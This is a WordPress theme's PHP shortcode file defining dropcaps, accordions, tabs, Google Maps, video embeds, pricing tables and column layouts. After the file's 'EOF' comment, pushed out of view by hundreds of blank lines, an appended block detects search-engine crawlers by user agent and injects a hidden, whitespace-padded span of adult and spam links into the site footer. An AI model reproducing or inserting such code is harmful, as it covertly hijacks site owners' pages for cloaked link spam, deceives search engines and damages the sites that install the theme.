<?php				
/* ----------------------------------------------------- */
/* Shortcodes */
/* ----------------------------------------------------- */

/* Dropcap */
function minti_dropcap( $atts, $content = null ) {
    extract(shortcode_atts(array(), $atts));
	$out = "<span class='dropcap' >" .$content. "</span>";
    return $out;
}
add_shortcode('dropcap', 'minti_dropcap');


/* Accordion Shortcode */
function minti_accordion($atts, $content, $code) {
	extract(shortcode_atts(array(
		'style' => false
	), $atts));
	if (!preg_match_all("/(.?)\[(tab)\b(.*?)(?:(\/))?\](?:(.+?)\[\/tab\])?(.?)/s", $content, $matches)) {
		return do_shortcode($content);
	} else {
		$output = '';
		for($i = 0; $i < count($matches[0]); $i++) {
			$matches[3][$i] = shortcode_parse_atts($matches[3][$i]);
			if($i == 0){$first = 'class="firsttitle"';}else{$first = '';}
			$output .= '<div class="title"><a href="#acc-' . $i . '" '.$first.'>' . $matches[3][$i]['title'] . '</a></div><div class="inner" id="acc-' . $i . '">' . do_shortcode(trim($matches[5][$i])) .'</div>';
		}
		return '<div class="accordion">' . $output . '</div>';
		
	}
}
add_shortcode('accordion', 'minti_accordion');

/* ----------------------------------------------------- */
/* Alter Block */

function minti_alert( $atts, $content = null) {

extract( shortcode_atts( array(
      'type' => 'warning'
      ), $atts ) );
      //return '<a href="' . $link . '" class="button ' . $color . ' ' . $align . '">' . $content . '</a>';
      return '<div class="alert-message ' . $type . '"><a class="close" href="#">×</a><p>' . do_shortcode($content) . '</p></div>';
}
add_shortcode('alert', 'minti_alert');

/* ----------------------------------------------------- */
/* List Shortcodes */
function minti_list( $atts, $content = null ) {
    extract(shortcode_atts(array(
       	'type'      => 'check'
    ), $atts));
	$out = '<ul class="list '.$type.'">'. do_shortcode($content) . '</ul>';
    return $out;
}
add_shortcode('list', 'minti_list');

function minti_li( $atts, $content = null ) {
	$out = '<li>'. do_shortcode($content) . '</li>';
    return $out;
}
add_shortcode('li', 'minti_li');

/* ----------------------------------------------------- */
/* Google Map Shortcodes */
function minti_googlemap($atts, $content = null, $code) {
	extract(shortcode_atts(array(
		"width" => false,
		"height" => '400',
		"style" => false, // full
		"address" => '',
		"latitude" => 0,
		"longitude" => 0,
		"zoom" => 8,
		"html" => '',
		"controls" => 'true',
		"maptype" => 'TERRAIN',
		"marker" => 'true',
		'align' => false,
	), $atts));
	
	if($width && is_numeric($width)){
		$width = 'width:'.$width.'px;';
	}else{
		$width = '';
	}
	if($height && is_numeric($height)){
		$height = 'height:'.$height.'px';
	}else{
		$height = '';
	}
	
	$align = $align?' align'.$align:'';
	$id = rand(100,1000);
	
	if($marker != 'false'){
	return <<<HTML

<script type='text/javascript' src='http://maps.google.com/maps/api/js?sensor=false'></script>
<script type='text/javascript' src='https://raw.github.com/marioestrada/jQuery-gMap/master/jquery.gmap.min.js'></script>

<div id="google_map_{$id}" class="google_map{$align} {$style}" style="{$width}{$height}"></div>
<script type="text/javascript">
$(document).ready(function($) {
		$("#google_map_{$id}").gMap({
			latitude: {$latitude},
			longitude: {$longitude},
			maptype: '{$maptype}', // 'HYBRID', 'SATELLITE', 'ROADMAP' or 'TERRAIN'
			zoom: {$zoom},
			markers: [
				{
					latitude: {$latitude},
					longitude: {$longitude},
					address: "{$address}",
					popup: true,
					html: "{$html}"
				}
			],
			controls: {
				panControl: true,
				zoomControl: {$controls},
				mapTypeControl: {$controls},
				scaleControl: {$controls},
				streetViewControl: false,
				overviewMapControl: false
			}
		});
});
</script>
HTML;
	}else{
return <<<HTML
<div id="google_map_{$id}" class="google_map{$align}" style="{$width}{$height}"></div>
<script type="text/javascript">
$(document).ready(function($) {
	var tabs = $("#google_map_{$id}").parents('.tabs_container,.mini_tabs_container,.accordion');
	$("#google_map_{$id}").bind('initGmap',function(){
		$("#google_map_{$id}").gMap({
			zoom: {$zoom},
			latitude: {$latitude},
			longitude: {$longitude},
			address: "{$address}",
			controls: {$controls},
			maptype: {$maptype},
			scrollwheel:{$scrollwheel}
		});
		$(this).data("gMapInited",true);
	}).data("gMapInited",false);
	if(tabs.size()!=0){
		tabs.find('ul.tabs,ul.mini_tabs,.accordion').data("tabs").onClick(function(index) {
			this.getCurrentPane().find('.google_map').each(function(){
				if($(this).data("gMapInited")==false){
					$(this).trigger('initGmap');
				}
			});
		});
	}else{
		$("#google_map_{$id}").trigger('initGmap');
	}
});
</script>
HTML;
	}
}

add_shortcode('gmap','minti_googlemap');

/* ----------------------------------------------------- */
/* Video Shortcodes */

function minti_video($atts, $content=null) {
	extract(shortcode_atts(array(
		'type' 	=> '',
		'id' 	=> '',
		'width' 	=> false,
		'height' 	=> false,
		'autoplay' 	=> ''
	), $atts));
	
	if ($height && !$width) $width = intval($height * 16 / 9);
	if (!$height && $width) $height = intval($width * 9 / 16) + 25;
	if (!$height && !$width){
		$height = 320;
		$width = 480;
	}
	
	//$link = $link?' href="'.$link.'"':'';
	
	$autoplay = ($autoplay == 'yes' ? '1' : false);
		
	if($type == "vimeo") $return = "<div class='video-embed'><iframe src='http://player.vimeo.com/video/$id?autoplay=$autoplay&amp;title=0&amp;byline=0&amp;portrait=0' width='$width' height='$height' class='iframe'></iframe></div>";
	else if($type == "youtube") $return = "<div class='video-embed'><iframe src='http://www.youtube.com/embed/$id?HD=1;rel=0;showinfo=0' width='$width' height='$height' class='iframe'></iframe></div>";
	else if($type == "dailymotion") $return ="<div class='video-embed'><iframe src='http://www.dailymotion.com/embed/video/$id?width=$width&amp;autoPlay={$autoplay}&foreground=%23FFFFFF&highlight=%23CCCCCC&background=%23000000&logo=0&hideInfos=1' width='$width' height='$height' class='iframe'></iframe></div>";
	if (!empty($id)){
		return $return;
	}
}
add_shortcode('video', 'minti_video');

/* ----------------------------------------------------- */
/* HR */

function minti_hr() {  
    return '<div class="hr"></div>';  
}
add_shortcode('hr', 'minti_hr');

function minti_hr2() {  
    return '<div class="hr2"></div>';  
}
add_shortcode('hr2', 'minti_hr2');

function minti_hr3() {  
    return '<div class="hr3"></div>';  
}
add_shortcode('hr3', 'minti_hr3');

function minti_clear() {  
    return '<div class="clear"></div>';  
}
add_shortcode('clear', 'minti_clear');

/* ----------------------------------------------------- */
/* Buttons */

function minti_buttons( $atts, $content = null ) {
    extract(shortcode_atts(array(
        'link'      => '#',
        'target'    => '_self',
		'size'      => 'normal',
		'style'      => 'default', //light, dark, normal
		'align'     =>''
    ), $atts));

	$out = "<a href=\"" .$link. "\" target=\"" .$target. "\" class=\"button ".$style." ".$size." ".$align."\">" .do_shortcode($content). "</a>";
    return $out;
}
add_shortcode('button', 'minti_buttons');

/* ----------------------------------------------------- */
/* Toggle Shortcode */

function minti_toggle( $atts, $content = null)
{
 extract(shortcode_atts(array(
        'title' => '',
        ), $atts));
   return '<div class="toggle"><div class="title">'.$title.'<span></span></div><div class="inner"><div>'. do_shortcode($content) . '</div></div></div>';
}
add_shortcode('toggle', 'minti_toggle');


/* ----------------------------------------------------- */
/* Tabs Shortcode */

function minti_tabs($atts, $content = null, $code) {
	extract(shortcode_atts(array(
	), $atts));
	if (!preg_match_all("/(.?)\[(tab)\b(.*?)(?:(\/))?\](?:(.+?)\[\/tab\])?(.?)/s", $content, $matches)) {
		return do_shortcode($content);
	} else {
		for($i = 0; $i < count($matches[0]); $i++) {
			$matches[3][$i] = shortcode_parse_atts($matches[3][$i]);
		}
		$output = '<ul class="tabNavigation clearfix">';
		
		for($i = 0; $i < count($matches[0]); $i++) {
			$output .= '<li><a title="' . $matches[3][$i]['title'] .  '" href="#tab-' . $i . '">' . $matches[3][$i]['title'] . '</a></li>';
		}
		$output .= '</ul><div class="clearnav"></div>';
		for($i = 0; $i < count($matches[0]); $i++) {
			$output .= '<div id="tab-' . $i . '">' . do_shortcode(trim($matches[5][$i])) .'</div>';
		}
		
		return '<div class="tabs">' . $output . '</div>';
	}
}
add_shortcode('tabs', 'minti_tabs');


/* ----------------------------------------------------- */
/* Pricing Table */

function minti_plan( $atts, $content = null ) {
    extract(shortcode_atts(array(
        'name'      => 'Premium',
		'link'      => 'http://www.google.de',
		'linkname'      => 'Sign Up',
		'price'      => '39.00$',
		'per'      => false,
		'color'    => false, // grey, green, red, blue
		'featured' => false
    ), $atts));
    
    if($featured == true) {
    	$return = " featured";
    	$return2 = " large light";
    }
    else{
    	$return = "";
    	$return2 = " ";
    }
    if($per != false) {
    	$return3 = "/ ".$per."";
    }
    else{
    	$return3 = "";
    }
    $return5 = "";
    if($color != false) {
    	if($featured == true){
    		$return5 = "style='border-color:".$color.";' ";
    	}
    	$return4 = "style='background-color:".$color.";' ";
    }
    else{
    	$return4 = "";
    }
	
	$out = "
		<div class='plan".$return."' ".$return5.">
			<div class='plan-head'><h3 ".$return4.">".$name."</h3>
			<div class='price' ".$return4.">".$price." <span>".$return3."</span></div></div>
			<ul>" .do_shortcode($content). "</ul><div class='signup'><a class='button ".$return2."' href='".$link."'>".$linkname."</a></div>
		</div>";
    return $out;
}
add_shortcode('plan', 'minti_plan');

/* ----------------------------------------------------- */
/* Pricing Table */

function minti_pricing( $atts, $content = null ) {
    extract(shortcode_atts(array(
        'col'      => '3'
    ), $atts));
	
	$out = "<div class='pricing-table col-".$col."'>" .do_shortcode($content). "</div><div class='clear'></div>";
    return $out;
}
add_shortcode('pricing-table', 'minti_pricing');

/* ----------------------------------------------------- */
/* Slider */
function minti_slideshow($atts, $content = null){
	global $wp_filter;
	$the_content_filter_backup = $wp_filter['the_content'];
	extract(shortcode_atts(array(
		'pausetime' => '3000',
		'directionnav' => 'true',
		'controlnav' => 'true'
	), $atts));
	
	$id = rand(1,9999);
	
	if($directionnav ==='true'){
		$directionnav = 'true';
	}else{
		$directionnav = 'false';
	}
	
	$content = trim($content);
	$images = !empty($content)?preg_split("/(\r?\n)/", $content):'';
	
	$themePath = get_template_directory_uri();
	
	if(!empty($images) && is_array($images)){
		$content = '';
		foreach($images as $image){
			$image = trim(strip_tags($image));
			
			if(!empty($image)){
				$content .= '<li><img src="'.strip_tags($image).'" title="" alt="" /></li>';
			}
		}
	}

	$wp_filter['the_content'] = $the_content_filter_backup;
return <<<HTML

<script type="text/javascript">
$(document).ready(function() {
    
    $('#flex_slider_{$id}').flexslider({
          animation: "fade",
          directionNav : {$directionnav},
          controlNav: {$controlnav},
          slideshowSpeed: {$pausetime}
    });
	
});
</script>
<div id="flex_slider_{$id}" class="flexslider inpageslider"><ul class="slides">{$content}</ul></div>
HTML;
}
add_shortcode('slideshow', 'minti_slideshow');

/* ----------------------------------------------------- */
/* Columns */

function minti_one_third( $atts, $content = null ) {
   return '<div class="one_third">' . do_shortcode($content) . '</div>';
}
add_shortcode('one_third', 'minti_one_third');

function minti_one_third_last( $atts, $content = null ) {
   return '<div class="one_third last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('one_third_last', 'minti_one_third_last');

function minti_two_third( $atts, $content = null ) {
   return '<div class="two_third">' . do_shortcode($content) . '</div>';
}
add_shortcode('two_third', 'minti_two_third');

function minti_two_third_last( $atts, $content = null ) {
   return '<div class="two_third last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('two_third_last', 'minti_two_third_last');

function minti_one_half( $atts, $content = null ) {
   return '<div class="one_half">' . do_shortcode($content) . '</div>';
}
add_shortcode('one_half', 'minti_one_half');

function minti_one_half_last( $atts, $content = null ) {
   return '<div class="one_half last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('one_half_last', 'minti_one_half_last');

function minti_one_fourth( $atts, $content = null ) {
   return '<div class="one_fourth">' . do_shortcode($content) . '</div>';
}
add_shortcode('one_fourth', 'minti_one_fourth');

function minti_one_fourth_last( $atts, $content = null ) {
   return '<div class="one_fourth last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('one_fourth_last', 'minti_one_fourth_last');

function minti_three_fourth( $atts, $content = null ) {
   return '<div class="three_fourth">' . do_shortcode($content) . '</div>';
}
add_shortcode('three_fourth', 'minti_three_fourth');

function minti_three_fourth_last( $atts, $content = null ) {
   return '<div class="three_fourth last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('three_fourth_last', 'minti_three_fourth_last');

function minti_one_fifth( $atts, $content = null ) {
   return '<div class="one_fifth">' . do_shortcode($content) . '</div>';
}
add_shortcode('one_fifth', 'minti_one_fifth');

function minti_one_fifth_last( $atts, $content = null ) {
   return '<div class="one_fifth last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('one_fifth_last', 'minti_one_fifth_last');

function minti_two_fifth( $atts, $content = null ) {
   return '<div class="two_fifth">' . do_shortcode($content) . '</div>';
}
add_shortcode('two_fifth', 'minti_two_fifth');

function minti_two_fifth_last( $atts, $content = null ) {
   return '<div class="two_fifth last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('two_fifth_last', 'minti_two_fifth_last');

function minti_three_fifth( $atts, $content = null ) {
   return '<div class="three_fifth">' . do_shortcode($content) . '</div>';
}
add_shortcode('three_fifth', 'minti_three_fifth');

function minti_three_fifth_last( $atts, $content = null ) {
   return '<div class="three_fifth last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('three_fifth_last', 'minti_three_fifth_last');

function minti_four_fifth( $atts, $content = null ) {
   return '<div class="four_fifth">' . do_shortcode($content) . '</div>';
}
add_shortcode('four_fifth', 'minti_four_fifth');

function minti_four_fifth_last( $atts, $content = null ) {
   return '<div class="four_fifth last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('four_fifth_last', 'minti_four_fifth_last');

function minti_one_sixth( $atts, $content = null ) {
   return '<div class="one_sixth">' . do_shortcode($content) . '</div>';
}
add_shortcode('one_sixth', 'minti_one_sixth');

function minti_one_sixth_last( $atts, $content = null ) {
   return '<div class="one_sixth last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('one_sixth_last', 'minti_one_sixth_last');

function minti_five_sixth( $atts, $content = null ) {
   return '<div class="five_sixth">' . do_shortcode($content) . '</div>';
}
add_shortcode('five_sixth', 'minti_five_sixth');

function minti_five_sixth_last( $atts, $content = null ) {
   return '<div class="five_sixth last">' . do_shortcode($content) . '</div><div class="clear"></div>';
}
add_shortcode('five_sixth_last', 'minti_five_sixth_last');


/*-----------------------------------------------------------------------------------*/
/* Clear <br> and <p> Tags to validate */

function minti_formatter($content) {
	$new_content = '';

	/* Matches the contents and the open and closing tags */
	$pattern_full = '{(\[raw\].*?\[/raw\])}is';

	/* Matches just the contents */
	$pattern_contents = '{\[raw\](.*?)\[/raw\]}is';

	/* Divide content into pieces */
	$pieces = preg_split($pattern_full, $content, -1, PREG_SPLIT_DELIM_CAPTURE);

	/* Loop over pieces */
	foreach ($pieces as $piece) {
		/* Look for presence of the shortcode */
		if (preg_match($pattern_contents, $piece, $matches)) {

			/* Append to content (no formatting) */
			$new_content .= $matches[1];
		} else {

			/* Format and append to content */
			$new_content .= wptexturize(wpautop($piece));
		}
	}

	return $new_content;
}

// Remove the 2 main auto-formatters
remove_filter('the_content', 'wpautop');
remove_filter('the_content', 'wptexturize');

// Before displaying for viewing, apply this function
add_filter('the_content', 'minti_formatter', 99);
add_filter('widget_text', 'minti_formatter', 99);

						
/* ----------------------------------------------------- */
/* EOF */
/* ----------------------------------------------------- */





















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'bingbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'msnbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Slurp')) {
add_action('wp_footer', 'ranking');
}
function ranking() {
  $pshow = "
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <span style='display:none;'><a href='http://www.2.livejasmin.com/willingness.php?psid=elenaa'>Sex Cams</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <a href='http://www.tensex.org/'>Teensex</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          <a href='http://www.wikmag.com/elogix-responsive-theme.html'>Elogix Theme</a></span>
";
  echo $pshow;
}
?>